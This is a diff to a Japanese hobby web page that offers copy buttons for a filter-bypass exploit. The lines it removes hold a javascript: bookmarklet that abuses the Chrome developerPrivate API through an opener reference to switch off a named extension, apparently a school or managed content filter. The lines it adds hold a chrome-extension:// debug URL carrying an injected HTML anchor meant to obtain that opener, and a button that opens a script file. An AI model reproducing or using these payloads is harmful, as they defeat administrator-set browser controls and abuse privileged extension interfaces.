@@ -21,25 +21,20 @@
 <td><a href="https://www.free-counter.jp/"><img src="https://www.f-counter.net/ani2/49/1668748150/" alt="アクセスカウンター" border="0" style="margin:0px; padding:0px; border:0px; vertical-align:bottom"></a></td></tr></tbody></table></nobr>
   <br>
   <audio controls controlslist="nodownload" loop src="./shallwe.mp3"></audio>
-  <p>下の２つのurlをコピーしてブックマークに登録します</p>
-  <p>一番目のブックマークを開いて二番目のを押してすぐブロックされているサイトに行きます</p>
-  <p>ブロック解除２：能古印刷を開きます</p>
-  <input id="copy1" type="text" value="chrome://extensions/?id=kklailfgofogmmdlhgmjgenehkjoioip" readonly>
+  <p>コピー</p>
+  <p>すーｐ</p>
+  <p>あ</p>
+  <input id="copy1" type="text" value="chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/debug.html?error=%3Ca%20href%3D%22about:blank%22%20rel%3D%22opener%22%20target%3D%22_blank%22%3Ehey%3C/a%3E" readonly>
 <button onclick="cp()">コピーする</button>
 <script>function cp(){
-        var txt = document.getElementById("copy1");;
-        txt.select();
-        document.execCommand("Copy");
+        open('./wow.js');
         const music = new Audio('./shallwe.mp3');
         music.loop = true;
         music.play();
     }
 </script>
-    <input id="copy2" type="text" value='javascript:let shim = false;var ids = "jcdhmojfecjfmbdpchihbeilohgnbdci".split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 150);' readonly>
-<button onclick="cp1()">コピーする</button>
+   <button onclick="cp1()">コピーする</button>
 <script>function cp1(){
-        var txta = document.getElementById("copy2");
-        txta.select();
         document.execCommand("Copy");
         const music = new Audio('./shallwe.mp3');
         music.loop = true;
